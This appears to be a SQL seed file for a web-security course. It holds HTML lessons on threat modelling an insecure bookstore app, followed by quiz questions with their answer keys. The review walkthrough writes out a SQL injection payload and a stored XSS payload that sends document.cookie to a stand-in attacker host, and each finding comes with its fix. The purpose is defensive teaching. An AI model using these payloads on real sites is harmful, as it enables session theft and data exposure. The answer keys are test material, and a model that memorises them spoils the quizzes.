.dark .lesson-page h1 { color: #f9fafb; border-bottom-color: #fb7185; }
.dark .lesson-page h2 { color: #fda4af; }
.dark .lesson-page .ic { background: #4c0519; color: #fda4af; }
.dark .lesson-page .callout { background: #4c0519; border-left-color: #fb7185; }
.dark .lesson-page .callout-info { background: #0c4a6e; border-left-color: #38bdf8; }
.dark .lesson-page .callout-tip { background: #14532d; border-left-color: #4ade80; }
.dark .lesson-page table th, .dark .lesson-page table td { border-color: #4b5563; }
.dark .lesson-page table th { background: #4c0519; color: #fda4af; }
</style>
</head>
<body>
<div class="lesson-page">
  <h1>Capstone: BookNook Threat Model</h1>
  <p>The capstone is a realistic review of <strong>BookNook</strong>, a small bookstore app built quickly and never hardened. You will act as the security reviewer: inventory the app, model its threats, then fix what you find in the next lesson.</p>
  <h2>The application</h2>
  <pre class="code-block">BookNook — an online store
Routes   : store, search, product detail, cart, checkout
Accounts : register, login, profile, order history
Admin    : /admin/dashboard, /admin/products
Storage  : Postgres, object store for images, session cache</pre>
  <h2>Asset inventory</h2>
  <table>
    <tr><th>Asset</th><th>Sensitivity</th></tr>
    <tr><td>Customer records</td><td>PII — breach means regulatory exposure</td></tr>
    <tr><td>Credentials and sessions</td><td>Critical — account takeover</td></tr>
    <tr><td>Payment data</td><td>Outsourced to a card processor; tokens only</td></tr>
    <tr><td>Order history</td><td>Private per customer</td></tr>
    <tr><td>Admin functions</td><td>Critical — wholesale changes</td></tr>
  </table>
  <h2>Threat model of the login flow</h2>
  <pre class="code-block">[ User ] --POST /login--> [ Web app ] --query--> [ Account store ]
                           |                           |
                           +--check pw (bcrypt?)-------+
                           +--issue session ----------> [ Session store ]
                           +--log attempt ------------> [ Log sink    ]

STRIDE walk:
S  attacker pretends to be a user?      need auth verification
T  can a crafted request be replayed?   need CSRF + SameSite
I  do errors leak email existence?      check message text
D  unlimited tries?                     need rate limit
E  can a user reach /admin?             need role check</pre>
  <h2>Your review objectives</h2>
  <ol>
    <li>Find one SQL injection, one XSS, one IDOR, and one CSRF gap.</li>
    <li>Audit session cookie flags and security headers.</li>
    <li>Decide an order of fixes by risk, not by how easy they look.</li>
  </ol>
  <div class="callout callout-info">
    <strong>Same map, fresh eyes</strong>
    <p>Every feature gets the same four questions: What trust boundary is this? Who is it for? What input crosses it? What can an attacker do with that input?</p>
  </div>
  <div class="callout callout-tip">
    <strong>Keep receipts</strong>
    <p>Document each finding with the exact URL, the payload that proves it, and a code pointer. A review without evidence cannot be acted on.</p>
  </div>
</div>
</body>
</html>
$html$
),
(
  '02600000-0000-4000-8000-000000000427',
  '02600000-0000-4000-8000-000000000327',
  1,
  'Capstone: Secure App Review Walkthrough',
  $html$
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Capstone: Secure App Review Walkthrough</title>
<style>
.lesson-page { font-family: 'Segoe UI', system-ui, -apple-system, sans-serif; line-height: 1.7; color: #1f2937; max-width: 780px; margin: 0 auto; padding: 8px 16px 32px; }
.lesson-page h1 { color: #111827; font-size: 28px; border-bottom: 3px solid #e11d48; padding-bottom: 10px; margin-bottom: 20px; }
.lesson-page h2 { color: #be123c; font-size: 21px; margin: 28px 0 8px; }
.lesson-page p { margin: 12px 0; }
.lesson-page ul, .lesson-page ol { margin: 12px 0; padding-left: 24px; }
.lesson-page li { margin: 6px 0; }
.lesson-page .ic { background: #fff1f2; color: #be123c; padding: 2px 6px; border-radius: 4px; font-family: 'Consolas', 'Courier New', monospace; font-size: 0.92em; }
.lesson-page pre.code-block { background: #0f172a; color: #e2e8f0; padding: 16px; border-radius: 8px; overflow-x: auto; font-family: 'Consolas', 'Courier New', monospace; font-size: 14px; }
.lesson-page .callout { background: #ffe4e6; border-left: 4px solid #e11d48; padding: 12px 16px; border-radius: 6px; margin: 16px 0; }
.lesson-page .callout-info { background: #e0f2fe; border-left-color: #0ea5e9; }
.lesson-page .callout-tip { background: #dcfce7; border-left-color: #22c55e; }
.lesson-page .callout strong { text-transform: uppercase; font-size: 0.8em; letter-spacing: 0.5px; }
.lesson-page table { border-collapse: collapse; width: 100%; margin: 16px 0; }
.lesson-page table th, .lesson-page table td { border: 1px solid #d1d5db; padding: 8px 12px; text-align: left; }
.lesson-page table th { background: #fff1f2; color: #be123c; }
.dark .lesson-page { color: #e5e7eb; }
.dark .lesson-page h1 { color: #f9fafb; border-bottom-color: #fb7185; }
.dark .lesson-page h2 { color: #fda4af; }
.dark .lesson-page .ic { background: #4c0519; color: #fda4af; }
.dark .lesson-page .callout { background: #4c0519; border-left-color: #fb7185; }
.dark .lesson-page .callout-info { background: #0c4a6e; border-left-color: #38bdf8; }
.dark .lesson-page .callout-tip { background: #14532d; border-left-color: #4ade80; }
.dark .lesson-page table th, .dark .lesson-page table td { border-color: #4b5563; }
.dark .lesson-page table th { background: #4c0519; color: #fda4af; }
</style>
</head>
<body>
<div class="lesson-page">
  <h1>Capstone: Secure App Review Walkthrough</h1>
  <p>Now the review. Seven findings, demonstrated the way you would hunt them — payload in hand, evidence recorded, fix prescribed.</p>
  <h2>Finding 1 · SQL injection in search</h2>
  <pre class="code-block">GET /search?q=Boyne's+%27+OR+1%3D1+--
  → the product grid returns everything
Evidence: ' OR 1=1 -- makes the WHERE clause always true.
Fix: parameterize the query:
  WHERE title ILIKE $1  OR  author ILIKE $1</pre>
  <h2>Finding 2 · stored XSS in reviews</h2>
  <pre class="code-block">Review submitted: &lt;img src=x onerror="fetch('//evil.example/?c='+document.cookie)"&gt;
Rendered later via innerHTML → every visitor leaks their cookie.
Fix: render with textContent (or framework escape) + CSP script-src 'self'.</pre>
  <p>The same payload proves the review board trusts stored content blindly — a second-order risk for every future render.</p>
  <h2>Finding 3 · IDOR on order history</h2>
  <pre class="code-block">GET /account/orders/41842  returns any order number.
Fix: scope by session:
  SELECT * FROM orders WHERE id = $1 AND user_id = $2   (404 on mismatch)</pre>
  <h2>Finding 4 · CSRF on profile update</h2>
  <p>The email-change form has no token and the session cookie has no SameSite. A forged cross-site POST changes the victim's email, then the attacker runs password reset. Fix: SameSite=Lax cookie plus a per-session CSRF token verified server-side.</p>
  <h2>Finding 5 · session cookie flags</h2>
  <pre class="code-block">Set-Cookie: session=abc123; Path=/              BAD
Set-Cookie: session=abc123; Secure; HttpOnly; SameSite=Lax; Path=/   GOOD
Also missing: rotation after login and server-side invalidation on logout.</pre>
  <h2>Finding 6 · missing security headers</h2>
  <pre class="code-block">No CSP, no X-Frame-Options, no nosniff.
Fix (one middleware layer):
  Content-Security-Policy: default-src 'self'
  X-Frame-Options: DENY
  X-Content-Type-Options: nosniff
  Referrer-Policy: no-referrer</pre>
  <h2>Finding 7 · plaintext password storage</h2>
  <p>The register handler writes the raw password to a column. One leaked backup dumps every login. Fix: bcrypt or Argon2 with a per-user salt, plus login rate limiting and MFA for admin.</p>
  <h2>Prioritized plan</h2>
  <table>
    <tr><th>Priority</th><th>Fix</th><th>Why first</th></tr>
    <tr><td>P0</td><td>Parameterize search + render via textContent</td><td>Remote compromise of any account</td></tr>
    <tr><td>P0</td><td>IDOR ownership in the order query</td><td>Total account data exposure</td></tr>
    <tr><td>P1</td><td>Hash passwords; rotate sessions; CSRF token</td><td>Wide credential risk</td></tr>
    <tr><td>P2</td><td>Secure cookie flags + security headers</td><td>Shrinks the rest of the surface</td></tr>
  </table>
  <div class="callout callout-tip">
    <strong>Review anatomy</strong>
    <p>Five of these seven findings came from three questions: what input crosses a boundary, what does the server trust, and what does the browser trust. Master those and you can review any web app.</p>
  </div>
</div>
</body>
</html>
$html$
)
ON CONFLICT (id) DO NOTHING;

-- ----------------------------------------------------------------------------
-- 6. QUIZZES  (29 questions)
--    Q1-3 for lesson 303 · Q4-6 for 306 · Q7-9 for 309 · Q10-12 for 312
--    Q13-15 for 315 · Q16-18 for 318 · Q19-21 for 321 · Q22-24 for 324
--    Q25-29 for final assessment 328.
-- ----------------------------------------------------------------------------

INSERT INTO quizzes (id, lesson_id, question, explanation, position) VALUES
  ('02600000-0000-4000-8000-000000000501', '02600000-0000-4000-8000-000000000303',
   'Which list ranks the most critical web application security risks?',
   'The OWASP Top 10 ranks the most common and most impactful web risks.', 1),
  ('02600000-0000-4000-8000-000000000502', '02600000-0000-4000-8000-000000000303',
   'Which CIA property is broken when an attacker reads private customer data?',
   'Reading private data violates confidentiality.', 2),
  ('02600000-0000-4000-8000-000000000503', '02600000-0000-4000-8000-000000000303',
   'Which principle grants every process the minimum permissions it needs?',
   'Least privilege limits the blast radius of any single compromise.', 3),
  ('02600000-0000-4000-8000-000000000504', '02600000-0000-4000-8000-000000000306',
   'In STRIDE, what does the S stand for?',
   'Spoofing means faking an identity or a source.', 1),
  ('02600000-0000-4000-8000-000000000505', '02600000-0000-4000-8000-000000000306',
   'Which STRIDE category covers someone modifying a message in transit?',
   'Tampering changes data while it travels.', 2),
  ('02600000-0000-4000-8000-000000000506', '02600000-0000-4000-8000-000000000306',
   'What is the first step when threat modeling a feature?',
   'Identify the assets the feature protects.', 3),
  ('02600000-0000-4000-8000-000000000507', '02600000-0000-4000-8000-000000000309',
   'What is the root cause of SQL injection?',
   'User input is concatenated into SQL text and executed as code.', 1),
  ('02600000-0000-4000-8000-000000000508', '02600000-0000-4000-8000-000000000309',
   'Which technique prevents SQL injection at the database layer?',
   'Parameterized queries send SQL text and values separately.', 2),
  ('02600000-0000-4000-8000-000000000509', '02600000-0000-4000-8000-000000000309',
   'Which practice best supports a least privilege database account?',
   'The app connects as a minimal role with only the grants it needs.', 3),
  ('02600000-0000-4000-8000-000000000510', '02600000-0000-4000-8000-000000000312',
   'Which type of XSS stores the payload for every future visitor?',
   'Stored XSS lives in the database and runs repeatedly.', 1),
  ('02600000-0000-4000-8000-000000000511', '02600000-0000-4000-8000-000000000312',
   'Which API treats user text as plain text instead of markup?',
   'textContent renders values as inert text, never markup.', 2),
  ('02600000-0000-4000-8000-000000000512', '02600000-0000-4000-8000-000000000312',
   'Which header stops an injected script from loading remote code?',
   'Content-Security-Policy restricts which origins may run scripts.', 3),
  ('02600000-0000-4000-8000-000000000513', '02600000-0000-4000-8000-000000000315',
   'Which control most directly stops credential stuffing?',
   'Rate limiting and lockout throttle automated login attempts.', 1),
  ('02600000-0000-4000-8000-000000000514', '02600000-0000-4000-8000-000000000315',
   'How should passwords be stored?',
   'Use a slow salted hash such as bcrypt or Argon2.', 2),
  ('02600000-0000-4000-8000-000000000515', '02600000-0000-4000-8000-000000000315',
   'What identifies an IDOR bug?',
   'The server trusts a client-supplied object id without checking ownership.', 3),
  ('02600000-0000-4000-8000-000000000516', '02600000-0000-4000-8000-000000000318',
   'Which cookie attribute stops JavaScript from reading the session id?',
   'HttpOnly hides the cookie from document.cookie.', 1),
  ('02600000-0000-4000-8000-000000000517', '02600000-0000-4000-8000-000000000318',
   'Which cookie attribute forces HTTPS-only transmission?',
   'Secure restricts the cookie to encrypted channels.', 2),
  ('02600000-0000-4000-8000-000000000518', '02600000-0000-4000-8000-000000000318',
   'Which defense blocks cross-site forged requests without user consent?',
   'SameSite cookies plus a per-session CSRF token.', 3),
  ('02600000-0000-4000-8000-000000000519', '02600000-0000-4000-8000-000000000321',
   'Which header forces browsers to remember HTTPS for a domain?',
   'HSTS pins HTTPS so downgrade attempts fail.', 1),
  ('02600000-0000-4000-8000-000000000520', '02600000-0000-4000-8000-000000000321',
   'Which attack does HSTS most directly prevent?',
   'Protocol downgrade, also called SSL stripping.', 2),
  ('02600000-0000-4000-8000-000000000521', '02600000-0000-4000-8000-000000000321',
   'Which header stops browsers from guessing a files content type?',
   'X-Content-Type-Options: nosniff forbids MIME sniffing.', 3),
  ('02600000-0000-4000-8000-000000000522', '02600000-0000-4000-8000-000000000324',
   'In SSRF, who is used as the attack proxy?',
   'The vulnerable server makes the request on behalf of the attacker.', 1),
  ('02600000-0000-4000-8000-000000000523', '02600000-0000-4000-8000-000000000324',
   'Which address is a classic SSRF target on cloud hosts?',
   '169.254.169.254 is the cloud metadata service.', 2),
  ('02600000-0000-4000-8000-000000000524', '02600000-0000-4000-8000-000000000324',
   'Which validation strategy is safest for enums such as roles?',
   'An allowlist rejects anything not explicitly permitted.', 3),
  ('02600000-0000-4000-8000-000000000525', '02600000-0000-4000-8000-000000000328',
   'Which category is ranked A01 in the current OWASP Top 10?',
   'Broken Access Control is the top web risk in the 2021 edition.', 1),
  ('02600000-0000-4000-8000-000000000526', '02600000-0000-4000-8000-000000000328',
   'A login endpoint runs no rate limiting. Which risk does that create?',
   'Automated brute force and credential stuffing become trivial.', 2),
  ('02600000-0000-4000-8000-000000000527', '02600000-0000-4000-8000-000000000328',
   'Why do apps rotate the session id right after login?',
   'Rotation defeats session fixation and narrows theft windows.', 3),
  ('02600000-0000-4000-8000-000000000528', '02600000-0000-4000-8000-000000000328',
   'Which tool category scans source code without running the application?',
   'SAST inspects code statically, catching injection patterns early.', 4),
  ('02600000-0000-4000-8000-000000000529', '02600000-0000-4000-8000-000000000328',
   'During the capstone the search query concatenates user text. What is the primary fix?',
   'Move to a parameterized query so the input is always data.', 5)
ON CONFLICT (id) DO NOTHING;

-- ----------------------------------------------------------------------------
-- 7. QUIZ OPTIONS  (116 options)
--    Each question has 4 options; the position of the correct answer varies.
--    Q1 options 1001-1012 · Q2 1013-1024 · Q3 1025-1036 · Q4 1037-1048
--    Q5 1049-1060 · Q6 1061-1072 · Q7 1073-1084 · Q8 1085-1096 · Q9 1097-1116
-- ----------------------------------------------------------------------------

INSERT INTO quiz_options (id, quiz_id, text, is_correct, position) VALUES
  -- Q1 (501): OWASP Top 10
  ('02600000-0000-4000-8000-000000001001', '02600000-0000-4000-8000-000000000501', 'The most critical web application security risks', TRUE,  1),
  ('02600000-0000-4000-8000-000000001002', '02600000-0000-4000-8000-000000000501', 'The most popular JavaScript frameworks', FALSE, 2),
  ('02600000-0000-4000-8000-000000001003', '02600000-0000-4000-8000-000000000501', 'The top content management systems', FALSE, 3),
  ('02600000-0000-4000-8000-000000001004', '02600000-0000-4000-8000-000000000501', 'A ranking of attack source countries', FALSE, 4),
  -- Q1 (501)q2: confidentiality
  ('02600000-0000-4000-8000-000000001005', '02600000-0000-4000-8000-000000000502', 'Availability', FALSE, 1),
  ('02600000-0000-4000-8000-000000001006', '02600000-0000-4000-8000-000000000502', 'Confidentiality', TRUE,  2),
  ('02600000-0000-4000-8000-000000001007', '02600000-0000-4000-8000-000000000502', 'Non-repudiation', FALSE, 3),
  ('02600000-0000-4000-8000-000000001008', '02600000-0000-4000-8000-000000000502', 'Resilience', FALSE, 4),
  -- Q1 (501)q3: least privilege
  ('02600000-0000-4000-8000-000000001009', '02600000-0000-4000-8000-000000000503', 'Defense by obscurity', FALSE, 1),
  ('02600000-0000-4000-8000-000000001010', '02600000-0000-4000-8000-000000000503', 'Maximum convenience', FALSE, 2),
  ('02600000-0000-4000-8000-000000001011', '02600000-0000-4000-8000-000000000503', 'Least privilege', TRUE,  3),
  ('02600000-0000-4000-8000-000000001012', '02600000-0000-4000-8000-000000000503', 'Full transparency', FALSE, 4),
  -- Q2 (504): spoofing
  ('02600000-0000-4000-8000-000000001013', '02600000-0000-4000-8000-000000000504', 'Spoofing', TRUE,  1),
  ('02600000-0000-4000-8000-000000001014', '02600000-0000-4000-8000-000000000504', 'Smart devices', FALSE, 2),
  ('02600000-0000-4000-8000-000000001015', '02600000-0000-4000-8000-000000000504', 'Session tracing', FALSE, 3),
  ('02600000-0000-4000-8000-000000001016', '02600000-0000-4000-8000-000000000504', 'Social engineering', FALSE, 4),
  -- Q2 (504)q2: tampering
  ('02600000-0000-4000-8000-000000001017', '02600000-0000-4000-8000-000000000505', 'Spoofing', FALSE, 1),
  ('02600000-0000-4000-8000-000000001018', '02600000-0000-4000-8000-000000000505', 'Tampering', TRUE,  2),
  ('02600000-0000-4000-8000-000000001019', '02600000-0000-4000-8000-000000000505', 'Denial of service', FALSE, 3),
  ('02600000-0000-4000-8000-000000001020', '02600000-0000-4000-8000-000000000505', 'Elevation of privilege', FALSE, 4),
  -- Q2 (504)q3: first step
  ('02600000-0000-4000-8000-000000001021', '02600000-0000-4000-8000-000000000506', 'Buy infrastructure', FALSE, 1),
  ('02600000-0000-4000-8000-000000001022', '02600000-0000-4000-8000-000000000506', 'Pick a logo', FALSE, 2),
  ('02600000-0000-4000-8000-000000001023', '02600000-0000-4000-8000-000000000506', 'Write test cases', FALSE, 3),
  ('02600000-0000-4000-8000-000000001024', '02600000-0000-4000-8000-000000000506', 'Identify the protected assets', TRUE,  4),
  -- Q3 (507): sql injection root cause
  ('02600000-0000-4000-8000-000000001025', '02600000-0000-4000-8000-000000000507', 'Weak encryption keys', FALSE, 1),
  ('02600000-0000-4000-8000-000000001026', '02600000-0000-4000-8000-000000000507', 'Unpatched TLS versions', FALSE, 2),
  ('02600000-0000-4000-8000-000000001027', '02600000-0000-4000-8000-000000000507', 'Missing firewall rules', FALSE, 3),
  ('02600000-0000-4000-8000-000000001028', '02600000-0000-4000-8000-000000000507', 'User input concatenated into SQL statements', TRUE,  4),
  -- Q3 (507)q2: parameterized
  ('02600000-0000-4000-8000-000000001029', '02600000-0000-4000-8000-000000000508', 'Parameterized queries with bound values', TRUE,  1),
  ('02600000-0000-4000-8000-000000001030', '02600000-0000-4000-8000-000000000508', 'Double encoding of input', FALSE, 2),
  ('02600000-0000-4000-8000-000000001031', '02600000-0000-4000-8000-000000000508', 'Escaping quotes with backslashes', FALSE, 3),
  ('02600000-0000-4000-8000-000000001032', '02600000-0000-4000-8000-000000000508', 'Filtering the word select', FALSE, 4),
  -- Q3 (507)q3: least privilege db
  ('02600000-0000-4000-8000-000000001033', '02600000-0000-4000-8000-000000000509', 'A shared admin login', FALSE, 1),
  ('02600000-0000-4000-8000-000000001034', '02600000-0000-4000-8000-000000000509', 'Granting all databases to the app role', FALSE, 2),
  ('02600000-0000-4000-8000-000000001035', '02600000-0000-4000-8000-000000000509', 'A minimal role with only required grants', TRUE,  3),
  ('02600000-0000-4000-8000-000000001036', '02600000-0000-4000-8000-000000000509', 'Storing the database password in code', FALSE, 4),
  -- Q4 (510): stored xss
  ('02600000-0000-4000-8000-000000001037', '02600000-0000-4000-8000-000000000510', 'Stored XSS', TRUE,  1),
  ('02600000-0000-4000-8000-000000001038', '02600000-0000-4000-8000-000000000510', 'Reflected XSS', FALSE, 2),
  ('02600000-0000-4000-8000-000000001039', '02600000-0000-4000-8000-000000000510', 'DOM-based XSS on an isolated page', FALSE, 3),
  ('02600000-0000-4000-8000-000000001040', '02600000-0000-4000-8000-000000000510', 'HTTP header injection', FALSE, 4),
  -- Q4 (510)q2: textContent
  ('02600000-0000-4000-8000-000000001041', '02600000-0000-4000-8000-000000000511', 'innerHTML', FALSE, 1),
  ('02600000-0000-4000-8000-000000001042', '02600000-0000-4000-8000-000000000511', 'textContent', TRUE,  2),
  ('02600000-0000-4000-8000-000000001043', '02600000-0000-4000-8000-000000000511', 'insertAdjacentHTML', FALSE, 3),
  ('02600000-0000-4000-8000-000000001044', '02600000-0000-4000-8000-000000000511', 'document.write', FALSE, 4),
  -- Q4 (510)q3: CSP
  ('02600000-0000-4000-8000-000000001045', '02600000-0000-4000-8000-000000000512', 'X-Powered-By', FALSE, 1),
  ('02600000-0000-4000-8000-000000001046', '02600000-0000-4000-8000-000000000512', 'Server header', FALSE, 2),
  ('02600000-0000-4000-8000-000000001047', '02600000-0000-4000-8000-000000000512', 'Set-Cookie', FALSE, 3),
  ('02600000-0000-4000-8000-000000001048', '02600000-0000-4000-8000-000000000512', 'Content-Security-Policy', TRUE,  4),
  -- Q5 (513): credential stuffing
  ('02600000-0000-4000-8000-000000001049', '02600000-0000-4000-8000-000000000513', 'Longer password rules', FALSE, 1),
  ('02600000-0000-4000-8000-000000001050', '02600000-0000-4000-8000-000000000513', 'Rate limiting plus lockout', TRUE,  2),
  ('02600000-0000-4000-8000-000000001051', '02600000-0000-4000-8000-000000000513', 'Hidden password fields', FALSE, 3),
  ('02600000-0000-4000-8000-000000001052', '02600000-0000-4000-8000-000000000513', 'Client-side captcha only', FALSE, 4),
  -- Q5 (513)q2: password storage
  ('02600000-0000-4000-8000-000000001053', '02600000-0000-4000-8000-000000000514', 'A salted slow hash such as bcrypt', TRUE,  1),
  ('02600000-0000-4000-8000-000000001054', '02600000-0000-4000-8000-000000000514', 'MD5 with a global salt', FALSE, 2),
  ('02600000-0000-4000-8000-000000001055', '02600000-0000-4000-8000-000000000514', 'Reversible encryption with a shared key', FALSE, 3),
  ('02600000-0000-4000-8000-000000001056', '02600000-0000-4000-8000-000000000514', 'Plaintext plus access control', FALSE, 4),
  -- Q5 (513)q3: IDOR
  ('02600000-0000-4000-8000-000000001057', '02600000-0000-4000-8000-000000000515', 'The server rejects all requests', FALSE, 1),
  ('02600000-0000-4000-8000-000000001058', '02600000-0000-4000-8000-000000000515', 'The database is publicly reachable', FALSE, 2),
  ('02600000-0000-4000-8000-000000001059', '02600000-0000-4000-8000-000000000515', 'The server trusts a client-supplied object id', TRUE,  3),
  ('02600000-0000-4000-8000-000000001060', '02600000-0000-4000-8000-000000000515', 'The load balancer strips cookies', FALSE, 4),
  -- Q6 (516): HttpOnly
  ('02600000-0000-4000-8000-000000001061', '02600000-0000-4000-8000-000000000516', 'HttpOnly', TRUE,  1),
  ('02600000-0000-4000-8000-000000001062', '02600000-0000-4000-8000-000000000516', 'Secure', FALSE, 2),
  ('02600000-0000-4000-8000-000000001063', '02600000-0000-4000-8000-000000000516', 'Domain', FALSE, 3),
  ('02600000-0000-4000-8000-000000001064', '02600000-0000-4000-8000-000000000516', 'Path', FALSE, 4),
  -- Q6 (516)q2: Secure
  ('02600000-0000-4000-8000-000000001065', '02600000-0000-4000-8000-000000000517', 'Max-Age', FALSE, 1),
  ('02600000-0000-4000-8000-000000001066', '02600000-0000-4000-8000-000000000517', 'Path', FALSE, 2),
  ('02600000-0000-4000-8000-000000001067', '02600000-0000-4000-8000-000000000517', 'SameSite', FALSE, 3),
  ('02600000-0000-4000-8000-000000001068', '02600000-0000-4000-8000-000000000517', 'Secure', TRUE,  4),
  -- Q6 (516)q3: CSRF defense
  ('02600000-0000-4000-8000-000000001069', '02600000-0000-4000-8000-000000000518', 'Accept-Encoding header', FALSE, 1),
  ('02600000-0000-4000-8000-000000001070', '02600000-0000-4000-8000-000000000518', 'SameSite cookies plus CSRF token', TRUE,  2),
  ('02600000-0000-4000-8000-000000001071', '02600000-0000-4000-8000-000000000518', 'Disabling cookies', FALSE, 3),
  ('02600000-0000-4000-8000-000000001072', '02600000-0000-4000-8000-000000000518', 'A longer session timeout', FALSE, 4),
  -- Q7 (519): HSTS
  ('02600000-0000-4000-8000-000000001073', '02600000-0000-4000-8000-000000000519', 'Strict-Transport-Security', TRUE,  1),
  ('02600000-0000-4000-8000-000000001074', '02600000-0000-4000-8000-000000000519', 'Content-Security-Policy', FALSE, 2),
  ('02600000-0000-4000-8000-000000001075', '02600000-0000-4000-8000-000000000519', 'Referrer-Policy', FALSE, 3),
  ('02600000-0000-4000-8000-000000001076', '02600000-0000-4000-8000-000000000519', 'Permissions-Policy', FALSE, 4),
  -- Q7 (519)q2: HSTS attack
  ('02600000-0000-4000-8000-000000001077', '02600000-0000-4000-8000-000000000520', 'SQL injection', FALSE, 1),
  ('02600000-0000-4000-8000-000000001078', '02600000-0000-4000-8000-000000000520', 'Stored XSS', FALSE, 2),
  ('02600000-0000-4000-8000-000000001079', '02600000-0000-4000-8000-000000000520', 'Protocol downgrade and SSL stripping', TRUE,  3),
  ('02600000-0000-4000-8000-000000001080', '02600000-0000-4000-8000-000000000520', 'Server-side request forgery', FALSE, 4),
  -- Q7 (519)q3: nosniff
  ('02600000-0000-4000-8000-000000001081', '02600000-0000-4000-8000-000000000521', 'Content-Length', FALSE, 1),
  ('02600000-0000-4000-8000-000000001082', '02600000-0000-4000-8000-000000000521', 'Cache-Control', FALSE, 2),
  ('02600000-0000-4000-8000-000000001083', '02600000-0000-4000-8000-000000000521', 'Connection: close', FALSE, 3),
  ('02600000-0000-4000-8000-000000001084', '02600000-0000-4000-8000-000000000521', 'X-Content-Type-Options: nosniff', TRUE,  4),
  -- Q8 (522): SSRF proxy
  ('02600000-0000-4000-8000-000000001085', '02600000-0000-4000-8000-000000000522', 'The victim browser', FALSE, 1),
  ('02600000-0000-4000-8000-000000001086', '02600000-0000-4000-8000-000000000522', 'The vulnerable server', TRUE,  2),
  ('02600000-0000-4000-8000-000000001087', '02600000-0000-4000-8000-000000000522', 'The public DNS', FALSE, 3),
  ('02600000-0000-4000-8000-000000001088', '02600000-0000-4000-8000-000000000522', 'The certificate authority', FALSE, 4),
  -- Q8 (522)q2: metadata ip
  ('02600000-0000-4000-8000-000000001089', '02600000-0000-4000-8000-000000000523', '169.254.169.254', TRUE,  1),
  ('02600000-0000-4000-8000-000000001090', '02600000-0000-4000-8000-000000000523', '8.8.8.8', FALSE, 2),
  ('02600000-0000-4000-8000-000000001091', '02600000-0000-4000-8000-000000000523', '198.51.100.4', FALSE, 3),
  ('02600000-0000-4000-8000-000000001092', '02600000-0000-4000-8000-000000000523', '203.0.113.9', FALSE, 4),
  -- Q8 (522)q3: allowlist
  ('02600000-0000-4000-8000-000000001093', '02600000-0000-4000-8000-000000000524', 'Blacklisting known payloads', FALSE, 1),
  ('02600000-0000-4000-8000-000000001094', '02600000-0000-4000-8000-000000000524', 'Truncating input to one character', FALSE, 2),
  ('02600000-0000-4000-8000-000000001095', '02600000-0000-4000-8000-000000000524', 'An allowlist of permitted values', TRUE,  3),
  ('02600000-0000-4000-8000-000000001096', '02600000-0000-4000-8000-000000000524', 'Accepting anything and storing it', FALSE, 4),
  -- Q9 (525): A01
  ('02600000-0000-4000-8000-000000001097', '02600000-0000-4000-8000-000000000525', 'Broken Access Control', TRUE,  1),
  ('02600000-0000-4000-8000-000000001098', '02600000-0000-4000-8000-000000000525', 'Server Response Headers', FALSE, 2),
  ('02600000-0000-4000-8000-000000001099', '02600000-0000-4000-8000-000000000525', 'Cloud Storage Misuse', FALSE, 3),
  ('02600000-0000-4000-8000-000000001100', '02600000-0000-4000-8000-000000000525', 'Packet Filtering', FALSE, 4),
  -- Q9 (525)q2: rate limiting
  ('02600000-0000-4000-8000-000000001101', '02600000-0000-4000-8000-000000000526', 'Phishing resistant hardware', FALSE, 1),
  ('02600000-0000-4000-8000-000000001102', '02600000-0000-4000-8000-000000000526', 'Automated credential guessing', TRUE,  2),
  ('02600000-0000-4000-8000-000000001103', '02600000-0000-4000-8000-000000000526', 'Cold boot attacks', FALSE, 3),
  ('02600000-0000-4000-8000-000000001104', '02600000-0000-4000-8000-000000000526', 'Packet reordering', FALSE, 4),
  -- Q9 (525)q3: session rotation
  ('02600000-0000-4000-8000-000000001105', '02600000-0000-4000-8000-000000000527', 'SQL injection in login', FALSE, 1),
  ('02600000-0000-4000-8000-000000001106', '02600000-0000-4000-8000-000000000527', 'Output encoding in the dashboard', FALSE, 2),
  ('02600000-0000-4000-8000-000000001107', '02600000-0000-4000-8000-000000000527', 'Header spoofing', FALSE, 3),
  ('02600000-0000-4000-8000-000000001108', '02600000-0000-4000-8000-000000000527', 'Session fixation', TRUE,  4),
  -- Q9 (525)q4: SAST
  ('02600000-0000-4000-8000-000000001109', '02600000-0000-4000-8000-000000000528', 'DAST', FALSE, 1),
  ('02600000-0000-4000-8000-000000001110', '02600000-0000-4000-8000-000000000528', 'A browser-based fuzzer', FALSE, 2),
  ('02600000-0000-4000-8000-000000001111', '02600000-0000-4000-8000-000000000528', 'SAST', TRUE,  3),
  ('02600000-0000-4000-8000-000000001112', '02600000-0000-4000-8000-000000000528', 'A network sniffer', FALSE, 4),
  -- Q9 (525)q5: parameterized fix
  ('02600000-0000-4000-8000-000000001113', '02600000-0000-4000-8000-000000000529', 'Add a second password field', FALSE, 1),
  ('02600000-0000-4000-8000-000000001114', '02600000-0000-4000-8000-000000000529', 'Switch to a parameterized query', TRUE,  2),
  ('02600000-0000-4000-8000-000000001115', '02600000-0000-4000-8000-000000000529', 'Increase the table columns', FALSE, 3),
  ('02600000-0000-4000-8000-000000001116', '02600000-0000-4000-8000-000000000529', 'Disable the query cache', FALSE, 4)
ON CONFLICT (id) DO NOTHING;